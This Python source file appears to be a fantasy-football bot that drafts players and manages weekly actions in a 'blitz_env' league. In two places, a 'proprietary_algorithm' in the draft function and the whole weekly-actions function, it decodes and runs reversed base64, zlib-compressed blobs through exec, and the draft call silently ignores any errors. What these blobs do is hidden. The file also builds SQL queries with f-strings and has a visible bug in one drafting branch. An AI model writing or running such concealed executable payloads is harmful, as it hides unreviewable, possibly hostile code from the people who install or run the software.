from blitz_env.models import DatabaseManager, Player
from blitz_env import Player, AttemptedFantasyActions, WaiverClaim
import collections
import json
import copy
import pandas as pd

# NOTES
#
# Slots: [QB, RB, RB, WR, WR, QB/RB/WR/TE, RB/WR/TE, K, DST, Bench, Bench, Bench]
# PPR: 1
#
#
# add/drop starts in week 3
#

def get_positions_to_fill(db):
    df = pd.read_sql("SELECT * FROM league_settings", db.engine)
    return json.loads(df.iloc[0]["player_slots"])

def get_my_team(db) -> pd.DataFrame:
    """Get current team roster"""
    game_status = db.get_game_status()
    return list(db.session.query(Player).filter(Player.current_bot_id == game_status.current_bot_id))


def draft_player() -> str:
    """
    Selects a player to draft.

    Returns:
        str: The id of the drafted player.
    """

    db = DatabaseManager()
    league_settings = db.get_league_settings()
    game_status = db.get_game_status()
    # stats_db = StatsDB([league_settings.year - 1])

    # zero-based draft round
    current_draft_round = (game_status.current_draft_pick-1) // league_settings.num_teams

    print("-----------------------------------------------------------------")

    def proprietary_algorithm() -> str:
        try:
            _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
        except Exception as e:
            pass
        return ""

    # try the better algorithm first - if it fails, continue on to the basic implementation
    result = proprietary_algorithm()
    if result != "":
        return result

    print(f"round number: {current_draft_round}")
    print()

    # Filter out already drafted players
    # undrafted_players = [player for player in game_state.players if not is_drafted(player)]
    undrafted_players = list(db.session.query(Player).filter(Player.availability == 'AVAILABLE'))
    undrafted_qbs = [player for player in undrafted_players if player.allowed_positions[0] == 'QB']

    # penalize injured players by increasing their rank
    injured_players = set([])
    print(f"injured players: {injured_players}")
    for player in undrafted_players:
        if player.full_name in injured_players:
            print(f"Penalized {player.full_name} for being injured")
            player.rank += 7


    # Get a list of who's on our team already
    my_players = get_my_team(db)
    # my_players = [p for sublist in my_players_by_position for p in sublist]
    print(f"my players: {[p.full_name for p in my_players]}")
    print()

    # Count how many players we're allowed to field for each position
    allowed_position_counts = get_positions_to_fill(db)
    allowed_position_counts['TE'] = 0
    print(f"allowed_position_counts: {allowed_position_counts}")

    # handle bench position. for each bench, add one to each other position
    # note that allowed_position_counts tracks how many of each we can *field* at a time, while position_open_counts tracks how many we can still *draft*
    # position_open_counts = copy.deepcopy(allowed_position_counts)
    position_open_counts = collections.defaultdict(int)
    for pos in allowed_position_counts.keys():
        position_open_counts[pos] = allowed_position_counts[pos]
    # adjust counts
    bench_count = position_open_counts["BENCH"]
    flex_count = position_open_counts["FLEX"]
    superflex_count = position_open_counts["SUPERFLEX"]
    del position_open_counts["BENCH"]
    del position_open_counts["FLEX"]
    del position_open_counts["SUPERFLEX"]
    for pos in ["QB", "RB", "WR", "TE", "K", "DST"]:
        position_open_counts[pos] += bench_count
    for pos in ["RB", "WR", "TE"]:
        position_open_counts[pos] += flex_count
    for pos in ["QB", "RB", "WR", "TE"]:
        position_open_counts[pos] += superflex_count
    

    # count how many players we've already drafted in each position
    filled_position_counts = collections.defaultdict(int)
    for player in my_players:
        # TODO: handle multiple allowed_positions
        pos = player.allowed_positions[0]
        filled_position_counts[pos] += 1

    # subtract filled_position_counts from position_open_counts
    for pos in position_open_counts.keys():
        position_open_counts[pos] -= filled_position_counts[pos]

    print("Open position counts:")
    for pos, count in position_open_counts.items():
        print(f"{pos}: {count}")
    print()

    print("Filled position counts:")
    for pos, count in filled_position_counts.items():
        print(f"{pos}: {count}")
    print()

    open_positions = set()
    for pos, count in position_open_counts.items():
      if count > 0:
        open_positions.add(pos)
    print(f"Open positions: {open_positions}")

    # TODO: this logic is really only sound for positions that have one slot (i.e. "we can have one QB"). It doesn't really work for things like "we can have 3 RBs"
    unfilled_positions = set()
    for pos, count in filled_position_counts.items():
        if count == 0:
            unfilled_positions.add(pos)
    print(f"positions that are completely unfilled: {unfilled_positions}")
    print()

    # Select the player with the highest rank (lowest rank number)
    # TODO: handle multiple allowed_positions
    if undrafted_players:
        allowed_players = [player for player in undrafted_players if player.allowed_positions[0] in open_positions]

        if len(allowed_players) == 0:
            print("no allowed players found - drafting the best-ranked undrafted player regardless of position")
            if len(undrafted_players) > 0:
                p = min(undrafted_players, key=lambda p: p.rank)
                print(f"drafting {p.full_name} : {p.allowed_positions}")
                return p.id
            else:
                return ""

        rank_ordered = sorted(allowed_players, key=lambda p: p.rank)
        
        # if we're getting to the end of the draft, make sure we have a player for each position/slot
        # TODO: double-check for off-by-1 error here
        if league_settings.total_rounds - current_draft_round - 1 - len(unfilled_positions) <= 0:
            for player in rank_ordered:
                if player.allowed_positions[0] in unfilled_positions:
                    print("nearing end of draft, drafting player to fill an unfilled position")
                    print(f"drafting {player.full_name} : {player.allowed_positions}")
                    return player.id

        # only draft allowed count + 1 maximum for each position, don't do more.
        for player in rank_ordered:
            pos = player.allowed_positions[0]
            allowed_count = allowed_position_counts[pos]
            extras = filled_position_counts[pos] - allowed_position_counts[pos]
            if extras >= 1:
                # print(f"  skipping a {pos} because we already have {filled_position_counts[pos]}, which is {extras} extra")
                # skip because we already have enough of @pos
                continue
            print("drafting the best-ranked player, while skipping positions that we already have a lot of")
            print(f"drafting {player.full_name} : {player.allowed_positions}")
            return player.id

        print("drafting the best-ranked player in allowed_players")
        player = rank_ordered[0].id
        print(f"drafting {player.full_name} : {player.allowed_positions}")
        return player
    else:
        return ""  # Return empty string if no undrafted players are available


def get_current_fantasy_week(db):
    df = pd.read_sql("SELECT * FROM game_statuses", db.engine)
    return df.iloc[0]["current_fantasy_week"]

def get_current_bot_id(db):
    df = pd.read_sql("SELECT * FROM game_statuses", db.engine)
    return df.iloc[0]["current_bot_id"]

def get_my_remaining_budget(db, current_bot_id):
    queryStr = f"SELECT * FROM bots where id = '{current_bot_id}'"
    df = pd.read_sql(queryStr, db.engine) 
    return df.iloc[0]["remaining_waiver_budget"]

def get_current_opponent_id(db, current_bot_id, week):
    queryStr = f"SELECT * FROM matchups where week = {week} AND (home_bot_id = '{current_bot_id}' OR visitor_bot_id = '{current_bot_id}')"
    df = pd.read_sql(queryStr, db.engine)
    matchup = df.iloc[0]

    if matchup["home_bot_id"] == current_bot_id:
        return matchup["visitor_bot_id"]
    elif matchup["visitor_bot_id"] == current_bot_id:
        return matchup["home_bot_id"]
    else:
        return "Unknown"

def get_season_stats_for_available_players(db):
    queryStr = """
        SELECT *
        FROM players AS p
        INNER JOIN weekly_stats AS w
            ON p.id = w.fantasypros_id
        WHERE p.current_bot_id IS NULL
        ORDER BY FPTS desc
    """
    return pd.read_sql(queryStr, db.engine)



actions = None
def set_global_actions(act):
    global actions
    actions = act


def perform_weekly_fantasy_actions() -> AttemptedFantasyActions:
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
    global actions
    return actions
